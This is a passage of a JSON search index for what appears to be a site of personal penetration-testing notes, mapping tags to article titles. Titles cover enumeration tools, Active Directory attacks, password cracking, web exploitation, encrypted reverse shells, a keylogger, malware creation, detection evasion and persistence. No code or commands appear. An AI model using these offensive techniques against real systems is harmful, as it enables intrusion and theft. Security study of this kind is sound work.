<li>Reversing and patching thick clients applications</li> </ul>","tags":["tags"]},{"location":"tags/#docker","title":"docker","text":"<ul> <li>docker</li> <li>Pentesting docker</li> </ul>","tags":["tags"]},{"location":"tags/#domain","title":"domain","text":"<ul> <li>Port 53 - Domain Name Server (DNS)</li> <li>ctr.sh</li> <li>dnscan - A DNS subdomain scanner</li> </ul>","tags":["tags"]},{"location":"tags/#dorking","title":"dorking","text":"<ul> <li>Github dorks</li> <li>Google dorks</li> </ul>","tags":["tags"]},{"location":"tags/#dorkings","title":"dorkings","text":"<ul> <li>Test Network Infrastructure Configuration - OWASP Web Security Testing Guide</li> <li>Conduct search engine discovery reconnaissance for information leakage - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Server - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#dotpeek","title":"dotpeek","text":"<ul> <li>Reversing and patching thick clients applications</li> </ul>","tags":["tags"]},{"location":"tags/#dovecot","title":"dovecot","text":"<ul> <li>55006-55007 Dovecot pop3</li> </ul>","tags":["tags"]},{"location":"tags/#dread","title":"dread","text":"<ul> <li>Microsoft DREAD</li> </ul>","tags":["tags"]},{"location":"tags/#dsquery","title":"dsquery","text":"<ul> <li>dsquery</li> </ul>","tags":["tags"]},{"location":"tags/#dump-hashes","title":"dump hashes","text":"<ul> <li>CrackMapExec</li> <li>Invoke-TheHash</li> <li>mimikatz</li> <li>pypykatz</li> </ul>","tags":["tags"]},{"location":"tags/#ewpt","title":"eWPT","text":"<ul> <li>01. Information Gathering   /  Footprinting</li> <li>Pentesting Notes</li> </ul>","tags":["tags"]},{"location":"tags/#echo-mirage","title":"echo mirage","text":"<ul> <li>Traffic analysis - Thick client Applications</li> </ul>","tags":["tags"]},{"location":"tags/#encryption","title":"encryption","text":"<ul> <li>TCP reverse shell with AES encryption</li> <li>TCP reverse shell with hybrid encryption AES + RSA</li> <li>TCP reverse shell with RSA encryption</li> </ul>","tags":["tags"]},{"location":"tags/#enumeration","title":"enumeration","text":"<ul> <li>The ActiveDirectory PowerShell module</li> <li>Amass</li> <li>Aquatone - Automatize web scanner in large subdomain lists</li> <li>BloodHound</li> <li>braa - SNMP scanner</li> <li>cewl - A custom dictionary generator</li> <li>crunch - A dictionary generator</li> <li>CUPP - Common User Password Profiler</li> <li>dig axfr</li> <li>dnsenum - A tool to enumerate DNS</li> <li>DNSRecon - DNS Enumeration and Scanning Tool</li> <li>DomainPasswordSpray</li> <li>enum</li> <li>enum4linux</li> <li>EyeWitness</li> <li>ffuf - A fast web fuzzer written in Go</li> <li>fierce - DNS scanner that helps locate non-contiguous IP space and hostnames</li> <li>Final recon - a recon tool with modules</li> <li>Hashcat - A password recovery tool</li> <li>Bank - A HackTheBox machine</li> <li>Popcorn - A HackTheBox machine</li> <li>httprint - A web server fingerprinting tool</li> <li>JAWS - Just Another Windows (Enum) Script</li> <li>John the Ripper - A hash cracker and dictionary attack tool</li> <li>Kerbrute</li> <li>knockpy - A subdomain scanner</li> <li>LinEnum - A tool to scan Linux system</li> <li>MailSniper</li> <li>nslookup</li> <li>o365spray</li> <li>odat - Oracle Database Attacking Tool</li> <li>onesixtyone - Fast and simple SNMP scanner</li> <li>Powerview.ps1</li> <li>Seatbelt - A tool to scan Windows system</li> <li>SharpView</li> <li>snmpwalk - SNMP scanner</li> <li>SubBrute</li> <li>subfinder</li> <li>WafW00f - A firewall scanner</li> <li>Weevely - A PHP webshell backdoor generator</li> <li>whatweb - A web scanner</li> <li>wpscan - Wordpress Security Scanner</li> </ul>","tags":["tags"]},{"location":"tags/#evading-detection","title":"evading detection","text":"<ul> <li>Evading detection in file transfers</li> </ul>","tags":["tags"]},{"location":"tags/#exploitation","title":"exploitation","text":"<ul> <li>Building a plugin in obsidian</li> <li>Honeypots</li> <li>searchsploit</li> <li>Evading detection in file transfers</li> <li>Transferring files with code</li> <li>Transferring files techniques - Linux</li> <li>Transferring files techniques - Windows</li> <li>OWASP Web Security Testing Guide</li> <li>Web Exploitation Guide</li> </ul>","tags":["tags"]},{"location":"tags/#file","title":"file","text":"<ul> <li>exiftool - A tool for metadata edition</li> </ul>","tags":["tags"]},{"location":"tags/#file-integrity","title":"file integrity","text":"<ul> <li>Checksum</li> </ul>","tags":["tags"]},{"location":"tags/#file-transfer","title":"file transfer","text":"<ul> <li>Setting up servers</li> </ul>","tags":["tags"]},{"location":"tags/#file-transfer-technique","title":"file transfer technique","text":"<ul> <li>Evading detection in file transfers</li> <li>Transferring files with code</li> <li>Transferring files techniques - Linux</li> <li>Transferring files techniques - Windows</li> <li>uploadserver</li> </ul>","tags":["tags"]},{"location":"tags/#file-upload","title":"file upload","text":"<ul> <li>smbmap</li> </ul>","tags":["tags"]},{"location":"tags/#file-upload_1","title":"file-upload","text":"<ul> <li>Walkthrough - Greenhorn - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#fingerprinting","title":"fingerprinting","text":"<ul> <li>httprint - A web server fingerprinting tool</li> </ul>","tags":["tags"]},{"location":"tags/#firefox","title":"firefox","text":"<ul> <li>Pentesting browsers</li> <li>Man in the browser attack</li> </ul>","tags":["tags"]},{"location":"tags/#firewall","title":"firewall","text":"<ul> <li>Bypassing Next Generation Firewalls</li> </ul>","tags":["tags"]},{"location":"tags/#footprinting","title":"footprinting","text":"<ul> <li>01. Information Gathering   /  Footprinting</li> </ul>","tags":["tags"]},{"location":"tags/#forcing","title":"forcing","text":"<ul> <li>Crowbar</li> </ul>","tags":["tags"]},{"location":"tags/#forensic","title":"forensic","text":"<ul> <li>Computer Forensic Fundamentals</li> </ul>","tags":["tags"]},{"location":"tags/#ftp","title":"ftp","text":"<ul> <li>21 ftp</li> <li>Walkthrough - A HackTheBox machine - Funnel</li> </ul>","tags":["tags"]},{"location":"tags/#ftp-server","title":"ftp server","text":"<ul> <li>pyftpdlib - A ftp server written in python</li> </ul>","tags":["tags"]},{"location":"tags/#gathering","title":"gathering","text":"<ul> <li>OSINT</li> </ul>","tags":["tags"]},{"location":"tags/#gcp","title":"gcp","text":"<ul> <li>gcloud CLI</li> <li>Google Cloud Platform Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#google-cloud-platform","title":"google cloud platform","text":"<ul> <li>gcloud CLI</li> <li>Google Cloud Platform Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#graphql","title":"graphql","text":"<ul> <li>Pentesting GraphQL</li> </ul>","tags":["tags"]},{"location":"tags/#headers","title":"headers","text":"<ul> <li>CSRF attack - Cross Site Request Forgery</li> </ul>","tags":["tags"]},{"location":"tags/#honeypots","title":"honeypots","text":"<ul> <li>Building a plugin in obsidian</li> <li>Honeypots</li> </ul>","tags":["tags"]},{"location":"tags/#host-based-firewall","title":"host based firewall","text":"<ul> <li>Hickjack the Internet Explorer process to bypass an host-based firewall</li> </ul>","tags":["tags"]},{"location":"tags/#http_1","title":"http","text":"<ul> <li>netcat</li> </ul>","tags":["tags"]},{"location":"tags/#idasm","title":"idasm","text":"<ul> <li>Reversing and patching thick clients applications</li> </ul>","tags":["tags"]},{"location":"tags/#ilasm","title":"ilasm","text":"<ul> <li>Reversing and patching thick clients applications</li> </ul>","tags":["tags"]},{"location":"tags/#ilspy","title":"ilspy","text":"<ul> <li>Reversing and patching thick clients applications</li> </ul>","tags":["tags"]},{"location":"tags/#imap","title":"imap","text":"<ul> <li>Ports 110,143,993, 995 IMAP POP3</li> </ul>","tags":["tags"]},{"location":"tags/#impacket","title":"impacket","text":"<ul> <li>1433 msSQL</li> <li>smbserver - from impacket</li> </ul>","tags":["tags"]},{"location":"tags/#information","title":"information","text":"<ul> <li>OSINT</li> </ul>","tags":["tags"]},{"location":"tags/#information-gathering","title":"information gathering","text":"<ul> <li>Information gathering</li> </ul>","tags":["tags"]},{"location":"tags/#intelligent-platform-management-interface","title":"intelligent platform management interface","text":"<ul> <li>623 - Intelligent Platform Management Interface (IPMI)</li> </ul>","tags":["tags"]},{"location":"tags/#ipmi","title":"ipmi","text":"<ul> <li>623 - Intelligent Platform Management Interface (IPMI)</li> <li>IPMItool</li> </ul>","tags":["tags"]},{"location":"tags/#ips","title":"ips","text":"<ul> <li>Bypassing IPS with handmade XOR Encryption</li> </ul>","tags":["tags"]},{"location":"tags/#java","title":"java","text":"<ul> <li>Log4j</li> <li>Ysoserial - A tool for Java deserialization</li> </ul>","tags":["tags"]},{"location":"tags/#java-rmi","title":"java rmi","text":"<ul> <li>1090 java rmi</li> </ul>","tags":["tags"]},{"location":"tags/#jboss","title":"jboss","text":"<ul> <li>8080 JBoss AS Instance 6.1.0</li> </ul>","tags":["tags"]},{"location":"tags/#jndi","title":"jndi","text":"<ul> <li>Walkthrough - Unified - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#jwt","title":"jwt","text":"<ul> <li>BurpSuite Labs - Json Web Token jwt</li> <li>BurpSuite Labs - Json Web Token jwt</li> <li>Json Web Token attacks</li> </ul>","tags":["tags"]},{"location":"tags/#kerberoasting","title":"kerberoasting","text":"<ul> <li>GetUserSPNs - a module from Impacket</li> </ul>","tags":["tags"]},{"location":"tags/#kerberos","title":"kerberos","text":"<ul> <li>GetUserSPNs - a module from Impacket</li> <li>Kerberos Authentication</li> <li>kirbi2john</li> <li>Rubeus</li> </ul>","tags":["tags"]},{"location":"tags/#keycloak","title":"keycloak","text":"<ul> <li>Pentesting Keycloak</li> </ul>","tags":["tags"]},{"location":"tags/#keylogger","title":"keylogger","text":"<ul> <li>Dumping saved passwords from Google Chrome</li> <li>Hijacking Keepass Password Manager</li> <li>Simple keylogger in python</li> </ul>","tags":["tags"]},{"location":"tags/#labs","title":"labs","text":"<ul> <li>CPTS labs</li> <li>Basic Lab Setup - Thick client Applications</li> </ul>","tags":["tags"]},{"location":"tags/#language","title":"language","text":"<ul> <li>Markdown</li> </ul>","tags":["tags"]},{"location":"tags/#ldap","title":"ldap","text":"<ul> <li>Port 389 - 636 LDAP</li> <li>Access Control List -ACL</li> <li>Attacking Active Directory from Linux</li> <li>Enumerating Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Attacking Active Directory from Windows</li> <li>Enumerating Active Directory from Windows</li> <li>Privilege escalation in Active Directory from Windows</li> <li>Active Directory</li> <li>The ActiveDirectory PowerShell module</li> <li>BloodHound</li> <li>Inveigh</li> <li>Kerberos Authentication</li> <li>LDAP - Active Directory</li> <li>Microsoft Management Console (MMC)</li> <li>NT Authority System</li> <li>PowerUp.ps1</li> <li>Powerview.ps1</li> <li>Responder.py - A SMB server to listen to NTLM hashes</li> <li>SharpView</li> </ul>","tags":["tags"]},{"location":"tags/#linux","title":"linux","text":"<ul> <li>Access Control List -ACL</li> <li>Attacking Active Directory from Linux</li> <li>Enumerating Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Attacking Active Directory from Windows</li> <li>Enumerating Active Directory from Windows</li> <li>Arp poisoning</li> <li>Configuration files</li> <li>Cron jobs - path, wildcards, file overwrite.</li> <li>Dirty COW (Copy On Write)</li> <li>Kernel vulnerability exploitation</li> <li>Linux credentials storage</li> <li>lxd</li> <li>postfix - A SMTP server</li> <li>Process capabilities - getcap</li> <li>SSH keys</li> <li>Suid Binaries</li> <li>Transferring files techniques - Linux</li> </ul>","tags":["tags"]},{"location":"tags/#linux-pentesting","title":"linux pentesting","text":"<ul> <li>LinEnum - A tool to scan Linux system</li> <li>linPEAS - A tool to scan Linux system</li> <li>Linux Privilege Checker</li> </ul>","tags":["tags"]},{"location":"tags/#linux-privilege-escalation","title":"linux privilege escalation","text":"<ul> <li>Base - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#local-file-inclusion","title":"local file inclusion","text":"<ul> <li>Responder - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#log4j","title":"log4j","text":"<ul> <li>Walkthrough - Unified - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#lxd","title":"lxd","text":"<ul> <li>lxd</li> </ul>","tags":["tags"]},{"location":"tags/#lxd-exploitation","title":"lxd exploitation","text":"<ul> <li>Walkthrough - Included - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#magnolia","title":"magnolia","text":"<ul> <li>Pentesting magnolia</li> </ul>","tags":["tags"]},{"location":"tags/#mariadb","title":"mariadb","text":"<ul> <li>3306 mariadb mysql</li> <li>Sequel - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#metasploit","title":"metasploit","text":"<ul> <li>Lame - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#microsoft","title":"microsoft","text":"<ul> <li>Exams - Practice the AZ-500</li> <li>Exams - Practice the AZ-900</li> </ul>","tags":["tags"]},{"location":"tags/#mimikatz","title":"mimikatz","text":"<ul> <li>Port 3389 - Remote Desktop Protocol (RDP)</li> <li>kirbi2john</li> <li>Rubeus</li> </ul>","tags":["tags"]},{"location":"tags/#mitm-relay","title":"mitm relay","text":"<ul> <li>Traffic analysis - Thick client Applications</li> </ul>","tags":["tags"]},{"location":"tags/#mobile-pentesting","title":"mobile pentesting","text":"<ul> <li>Android Debug Bridge - ADB</li> <li>apktool</li> <li>drozer - A security testing framework for Android</li> <li>Frida - A dynamic instrumentation toolkit</li> <li>Mobile Security Framework - MobSF</li> <li>Objection</li> <li>scrcpy</li> <li>Setting up the mobile pentesting environment</li> </ul>","tags":["tags"]},{"location":"tags/#mongodb","title":"mongodb","text":"<ul> <li>27017-27018 mongodb</li> <li>Walkthough - A HackTheBox machine - Mongod</li> <li>Walkthrough - Unified - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#moodle","title":"moodle","text":"<ul> <li>moodlescan</li> </ul>","tags":["tags"]},{"location":"tags/#msoffice","title":"msoffice","text":"<ul> <li>MailSniper</li> <li>o365spray</li> </ul>","tags":["tags"]},{"location":"tags/#mssql","title":"mssql","text":"<ul> <li>1433 msSQL</li> <li>sqsh</li> </ul>","tags":["tags"]},{"location":"tags/#mysql","title":"mysql","text":"<ul> <li>3306 mariadb mysql</li> </ul>","tags":["tags"]},{"location":"tags/#nessus","title":"nessus","text":"<ul> <li>Vulnerability assessment</li> </ul>","tags":["tags"]},{"location":"tags/#network","title":"network","text":"<ul> <li>Network traffic capture tools</li> <li>vnstat - Monitoring network impact</li> </ul>","tags":["tags"]},{"location":"tags/#network-services","title":"network services","text":"<ul> <li>Well-known ports</li> </ul>","tags":["tags"]},{"location":"tags/#next-generation-firewalls","title":"next generation firewalls","text":"<ul> <li>Bypassing Next Generation Firewalls</li> </ul>","tags":["tags"]},{"location":"tags/#nmap","title":"nmap","text":"<ul> <li>xsltproc</li> </ul>","tags":["tags"]},{"location":"tags/#odata","title":"oData","text":"<ul> <li>Pentesting oDAta</li> </ul>","tags":["tags"]},{"location":"tags/#open-source","title":"open source","text":"<ul> <li>Apache CloudStack Essentials</li> <li>Openstack Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#openssl","title":"openssl","text":"<ul> <li>openSSL - Cryptography and SSL/TLS Toolkit</li> </ul>","tags":["tags"]},{"location":"tags/#openvas","title":"openvas","text":"<ul> <li>Vulnerability assessment</li> </ul>","tags":["tags"]},{"location":"tags/#oracle-tns","title":"oracle tns","text":"<ul> <li>1521 - Oracle Transparent Network Substrate (TNS)</li> <li>sqlplus - To connect and manage the Oracle RDBMS</li> </ul>","tags":["tags"]},{"location":"tags/#osint","title":"osint","text":"<ul> <li>Github dorks</li> <li>Google dorks</li> </ul>","tags":["tags"]},{"location":"tags/#package-manager","title":"package manager","text":"<ul> <li>pip</li> </ul>","tags":["tags"]},{"location":"tags/#pass-the-hash-attack","title":"pass the hash attack","text":"<ul> <li>Invoke-TheHash</li> <li>mimikatz</li> </ul>","tags":["tags"]},{"location":"tags/#pass-the-hash","title":"pass-the-hash","text":"<ul> <li>smbmap</li> </ul>","tags":["tags"]},{"location":"tags/#passive-reconnaissance","title":"passive reconnaissance","text":"<ul> <li>p0f</li> </ul>","tags":["tags"]},{"location":"tags/#passiverecon","title":"passiverecon","text":"<ul> <li>HTTrack - A tool for mirrowing sites</li> <li>nmap - A network exploration and security auditing tool</li> <li>Powercat - An alternative to netcat coded in PowerShell</li> </ul>","tags":["tags"]},{"location":"tags/#password-cracker","title":"password cracker","text":"<ul> <li>ophcrack - A windows password cracker based on rainbow tables</li> </ul>","tags":["tags"]},{"location":"tags/#passwords","title":"passwords","text":"<ul> <li>CrackMapExec</li> <li>Crowbar</li> <li>hydra</li> <li>Invoke-TheHash</li> <li>Lazagne</li> <li>medusa</li> <li>mimikatz</li> <li>pypykatz</li> </ul>","tags":["tags"]},{"location":"tags/#payloads","title":"payloads","text":"<ul> <li>darkarmour</li> <li>mythic</li> <li>nishang</li> <li>Creating malware and custom payloads</li> </ul>","tags":["tags"]},{"location":"tags/#pentest","title":"pentest","text":"<ul> <li>Information gathering</li> <li>OSINT</li> </ul>","tags":["tags"]},{"location":"tags/#pentesting","title":"pentesting","text":"<ul> <li>Welcome to Hacking Life!</li> <li>Port 22 - Secure Shell (SSH)</li> <li>Port 22 - Secure Shell (SSH)</li> <li>3128 squid</li> <li>Port 53 - Domain Name Server (DNS)</li> <li>Port 5355 - LLMNR/NBT-NS Poisoning</li> <li>Port 5355 - LLMNR/NBT-NS Poisoning</li> <li>69 - tftp</li> <li>Aquatone - Automatize web scanner in large subdomain lists</li> <li>Bind Shells</li> <li>Pentesting browsers</li> <li>Configuration files</li> <li>Cron jobs - path, wildcards, file overwrite.</li> <li>Crowbar</li> <li>curl</li> <li>dig axfr</li> <li>dirb - A web content enumeration tool</li> <li>Dirty COW (Copy On Write)</li> <li>django pentesting</li> <li>dnscan - A DNS subdomain scanner</li> <li>dnsenum - A tool to enumerate DNS</li> <li>DNSpy - A .NET decompiler for windows</li> <li>DNSRecon - DNS Enumeration and Scanning Tool</li> <li>eJPT - eLearnSecurity Junior Penetration Tester</li> <li>exiftool - A tool for metadata edition</li> <li>EyeWitness</li> <li>feroxbuster - A web content enumeration tool for not referenced resources</li> <li>ffuf - A fast web fuzzer written in Go</li> <li>fierce - DNS scanner that helps locate non-contiguous IP space and hostnames</li> <li>Gopherus</li> <li>Gopherus</li> <li>grep</li> <li>Hashcat - A password recovery tool</li> <li>httprint - A web server fingerprinting tool</li> <li>hydra</li> <li>GetUserSPNs - a module from Impacket</li> <li>ntlmrelayx - a module from Impacket</li> <li>PsExec - a module from Impacket</li> <li>SMBExec - a module from Impacket</li> <li>Impacket - A python tool for network protocols</li> <li>IPMItool</li> <li>JAWS - Just Another Windows (Enum) Script</li> <li>John the Ripper - A hash cracker and dictionary attack tool</li> <li>Kernel vulnerability exploitation</li> <li>kirbi2john</li> <li>knockpy - A subdomain scanner</li> <li>Lateral movements</li> <li>Laudanum - Injectable Web Exploit Code</li> <li>Lazagne</li> <li>LinEnum - A tool to scan Linux system</li> <li>linPEAS - A tool to scan Linux system</li> <li>Linux exploit suggester</li> <li>Linux Privilege Checker</li> <li>LOLbins - Living off the land binaries - LOLbas and GTFObins</li> <li>M365 CLI</li> <li>Pentesting magnolia</li> <li>MailSniper</li> <li>medusa</li> <li>metasploit</li> <li>moodlescan</li> <li>msfvenom</li> <li>Pentesting MyBB</li> <li>netcraft</li> <li>netdiscover - A network enumeration tool based on ARP request</li> <li>Network traffic capture tools</li> <li>noip</li> <li>nslookup</li> <li>o365spray</li> <li>Pentesting oDAta</li> <li>ophcrack - A windows password cracker based on rainbow tables</li> <li>Pentesting Notes</li> <li>Pentesting GraphQL</li> <li>Pivoting, Tunneling, and Port Forwarding</li> <li>proxychains</li> <li>pyftpdlib - A ftp server written in python</li> <li>pyinstaller</li> <li>rar - Winrar</li> <li>Reverse engineering</li> <li>Reverse Shells</li> <li>Reverse Shells</li> <li>Rubeus</li> <li>Samba Suite</li> <li>searchsploit</li> <li>Seatbelt - A tool to scan Windows system</li> <li>Spawn a shell</li> <li>SQLi Cheat sheet for manual injection</li> <li>sqlmap - A tool for testing SQL injection</li> <li>SSH keys</li> <li>sslyze - A tool for scanning certificates</li> <li>SubBrute</li> <li>subfinder</li> <li>sublist3r - A subdomain enumerating tool</li> <li>Suid Binaries</li> <li>swaks</li> <li>tcpdump - A command-line packet analyzer</li> <li>The Harvester - A tool for pasive and active reconnaissance</li> <li>Tmux - A terminal multiplexer</li> <li>veil - A backdoor generator</li> <li>Vulnerability assessment</li> <li>Vulnhub Raven 1</li> <li>Vulnhub Raven 2</li> <li>w3af</li> <li>WafW00f - A firewall scanner</li> <li>waybackurls</li> <li>Pentesting web services</li> <li>Web Shells</li> <li>WebDav- WsgiDAV - A generic and extendable WebDAV server</li> <li>Weevely - A PHP webshell backdoor generator</li> <li>wfuzz</li> <li>whatweb - A web scanner</li> <li>Window Detective - A tool to view windows properties in the system</li> <li>Windows binaries -  LOLBAS</li> <li>Footprinting Windows</li> <li>winspy - A tool to view windows properties in the system</li> <li>pentesting wordpress</li> <li>wpscan - Wordpress Security Scanner</li> <li>xsltproc</li> <li>XSSer -  An automated web pentesting framework tool to detect and exploit XSS vulnerabilities</li> <li>OWASP Web Security Testing Guide</li> <li>OWASP Web Security Testing Guide</li> <li>Review Webserver Metafiles for Information Leakage - OWASP Web Security Testing Guide</li> <li>Enumerate Applications on Webserver - OWASP Web Security Testing Guide</li> <li>Review Webpage content for Information Leakage - OWASP Web Security Testing Guide</li> <li>Identify Application Entry Points - OWASP Web Security Testing Guide</li> <li>Map Execution Paths through applications - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Application Framework - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Applications - OWASP Web Security Testing Guide</li> <li>Map Application architecture - OWASP Web Security Testing Guide</li> <li>Mifare Classic</li> <li>Mifare Desfire</li> <li>NFC - Setting up proxmark3 RDV4.01</li> <li>Proxmark3 RDV4.01</li> <li>Proxmark3 RDV4.01</li> <li>RFID</li> <li>Web Exploitation Guide</li> <li>Web Exploitation Guide</li> <li>Arbitrary file upload</li> <li>Arbitrary file upload</li> <li>CSRF attack - Cross Site Request Forgery</li> <li>Directory Traversal attack</li> <li>HTTP Verb Tampering</li> <li>HTTP Verb Tampering</li> <li>Insecure deserialization</li> <li>Json Web Token attacks</li> <li>LFI attack - Local File Inclusion</li> <li>NoSQL injection</li> <li>NoSQL injection</li> <li>RFD attack - Reflected File Download</li> <li>RCE attack - Remote Code Execution</li> <li>RFI attack - Remote File Inclusion</li> <li>SSRF attack - Server Side Request Forgery</li> <li>Server-side Template Injection - SSTI</li> <li>Session Puzzling - Session Variable Overloading</li> <li>SQL injection</li> </ul>","tags":["tags"]},{"location":"tags/#pentesting-http-headers","title":"pentesting HTTP headers","text":"<ul> <li>HTTP headers</li> </ul>","tags":["tags"]},{"location":"tags/#pentesting-cloud","title":"pentesting cloud","text":"<ul> <li>Pentesting Amazon Web Services (AWS)</li> <li>Pentesting Azure</li> </ul>","tags":["tags"]},{"location":"tags/#pentesting-windows","title":"pentesting windows","text":"<ul> <li>SAMRDump</li> <li>smbserver - from impacket</li> <li>Windows Null session attack</li> <li>Winfo</li> </ul>","tags":["tags"]},{"location":"tags/#pentestingc","title":"pentesting\u00e7","text":"<ul> <li>Weevely - A PHP webshell backdoor generator</li> </ul>","tags":["tags"]},{"location":"tags/#persistence","title":"persistence","text":"<ul> <li>Making your binary persistent</li> </ul>","tags":["tags"]},{"location":"tags/#phishing","title":"phishing","text":"<ul> <li>BeEF - The browser exploitation framework project</li> <li>Tools for cloning a site</li> </ul>","tags":["tags"]},{"location":"tags/#php","title":"php","text":"<ul> <li>pentesmonkey php reverse shell</li> <li>Phpggc - A tool for PHP deserialization</li> <li>WhiteWinterWolf php webshell</li> </ul>","tags":["tags"]},{"location":"tags/#php-include","title":"php include","text":"<ul> <li>Responder - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#php-type-juggling","title":"php type juggling","text":"<ul> <li>Base - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#ping","title":"ping","text":"<ul> <li>fping - An improved ping tool</li> <li>How to resolve run of the mill...</li> </ul>","tags":["tags"]},{"location":"tags/#pluck-cms","title":"pluck-cms","text":"<ul> <li>Walkthrough - Greenhorn - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#pop3","title":"pop3","text":"<ul> <li>Ports 110,143,993, 995 IMAP POP3</li> </ul>","tags":["tags"]},{"location":"tags/#port","title":"port","text":"<ul> <li>Port 22 - Secure Shell (SSH)</li> <li>Port 3389 - Remote Desktop Protocol (RDP)</li> <li>Port 389 - 636 LDAP</li> <li>Port 5355 - LLMNR/NBT-NS Poisoning</li> <li>Port 5985, 5986 - Windows Remote Management (WinRM)</li> <li>Port 5985, 5986 - Windows Remote Management (WinRM)</li> <li>Port 873 - rsync</li> <li>Final recon - a recon tool with modules</li> </ul>","tags":["tags"]},{"location":"tags/#port-1090","title":"port 1090","text":"<ul> <li>1090 java rmi</li> </ul>","tags":["tags"]},{"location":"tags/#port-110","title":"port 110","text":"<ul> <li>Ports 110,143,993, 995 IMAP POP3</li> </ul>","tags":["tags"]},{"location":"tags/#port-111","title":"port 111","text":"<ul> <li>Port 111, 32731 -  rpc</li> <li>Port 2049 -  NFS Network File System</li> <li>Port 43 - whois</li> </ul>","tags":["tags"]},{"location":"tags/#port-135","title":"port 135","text":"<ul> <li>Port 135 - Windows Management Instrumentation (<code>WMI</code>)</li> </ul>","tags":["tags"]},{"location":"tags/#port-137","title":"port 137","text":"<ul> <li>Ports 137, 138, 139, 445 SMB</li> <li>rpcclient - A tool for interacting with smb shares</li> <li>smbclient - A tool for interacting with smb shares</li> </ul>","tags":["tags"]},{"location":"tags/#port-138","title":"port 138","text":"<ul> <li>Ports 137, 138, 139, 445 SMB</li> <li>rpcclient - A tool for interacting with smb shares</li> <li>smbclient - A tool for interacting with smb shares</li> </ul>","tags":["tags"]},{"location":"tags/#port-139","title":"port 139","text":"<ul> <li>Ports 137, 138, 139, 445 SMB</li> <li>rpcclient - A tool for interacting with smb shares</li> <li>smbclient - A tool for interacting with smb shares</li> </ul>","tags":["tags"]},{"location":"tags/#port-143","title":"port 143","text":"<ul> <li>Ports 110,143,993, 995 IMAP POP3</li> </ul>","tags":["tags"]},{"location":"tags/#port-1433","title":"port 1433","text":"<ul> <li>1433 msSQL</li> </ul>","tags":["tags"]},{"location":"tags/#port-1521","title":"port 1521","text":"<ul> <li>1521 - Oracle Transparent Network Substrate (TNS)</li> <li>sqlplus - To connect and manage the Oracle RDBMS</li> </ul>","tags":["tags"]},{"location":"tags/#port-161","title":"port 161","text":"<ul> <li>161-162 SNMP Simple Network Management Protocol</li> <li>braa - SNMP scanner</li> <li>odat - Oracle Database Attacking Tool</li> <li>onesixtyone - Fast and simple SNMP scanner</li> <li>snmpwalk - SNMP scanner</li> </ul>","tags":["tags"]},{"location":"tags/#port-162","title":"port 162","text":"<ul> <li>1521 - Oracle Transparent Network Substrate (TNS)</li> <li>161-162 SNMP Simple Network Management Protocol</li> </ul>","tags":["tags"]},{"location":"tags/#port-20","title":"port 20","text":"<ul> <li>21 ftp</li> </ul>","tags":["tags"]},{"location":"tags/#port-2049","title":"port 2049","text":"<ul> <li>Port 2049 -  NFS Network File System</li> </ul>","tags":["tags"]},{"location":"tags/#port-21","title":"port 21","text":"<ul> <li>21 ftp</li> </ul>","tags":["tags"]},{"location":"tags/#port-23","title":"port 23","text":"<ul> <li>23 telnet</li> </ul>","tags":["tags"]},{"location":"tags/#port-25","title":"port 25","text":"<ul> <li>Ports 25, 565, 587 - Simple Mail Tranfer Protocol (SMTP)</li> </ul>","tags":["tags"]},{"location":"tags/#port-27017","title":"port 27017","text":"<ul> <li>27017-27018 mongodb</li> <li>Walkthough - A HackTheBox machine - Mongod</li> </ul>","tags":["tags"]},{"location":"tags/#port-27018","title":"port 27018","text":"<ul> <li>27017-27018 mongodb</li> </ul>","tags":["tags"]},{"location":"tags/#port-3128","title":"port 3128","text":"<ul> <li>3128 squid</li> </ul>","tags":["tags"]},{"location":"tags/#port-3306","title":"port 3306","text":"<ul> <li>3306 mariadb mysql</li> <li>Sequel - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#port-445","title":"port 445","text":"<ul> <li>Ports 137, 138, 139, 445 SMB</li> <li>Tactics - A HackTheBox machine</li> <li>rpcclient - A tool for interacting with smb shares</li> <li>smbclient - A tool for interacting with smb shares</li> </ul>","tags":["tags"]},{"location":"tags/#port-465","title":"port 465","text":"<ul> <li>Ports 25, 565, 587 - Simple Mail Tranfer Protocol (SMTP)</li> </ul>","tags":["tags"]},{"location":"tags/#port-5432","title":"port 5432","text":"<ul> <li>5432 postgresql</li> </ul>","tags":["tags"]},{"location":"tags/#port-55007","title":"port 55007","text":"<ul> <li>55006-55007 Dovecot pop3</li> </ul>","tags":["tags"]},{"location":"tags/#port-55008","title":"port 55008","text":"<ul> <li>55006-55007 Dovecot pop3</li> </ul>","tags":["tags"]},{"location":"tags/#port-587","title":"port 587","text":"<ul> <li>Ports 25, 565, 587 - Simple Mail Tranfer Protocol (SMTP)</li> </ul>","tags":["tags"]},{"location":"tags/#port-623","title":"port 623","text":"<ul> <li>623 - Intelligent Platform Management Interface (IPMI)</li> <li>IPMItool</li> </ul>","tags":["tags"]},{"location":"tags/#port-6379","title":"port 6379","text":"<ul> <li>6379 redis</li> </ul>","tags":["tags"]},{"location":"tags/#port-6653","title":"port 6653","text":"<ul> <li>6653 Openflow</li> </ul>","tags":["tags"]},{"location":"tags/#port-69","title":"port 69","text":"<ul> <li>Walkthrough - Included - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#port-8080","title":"port 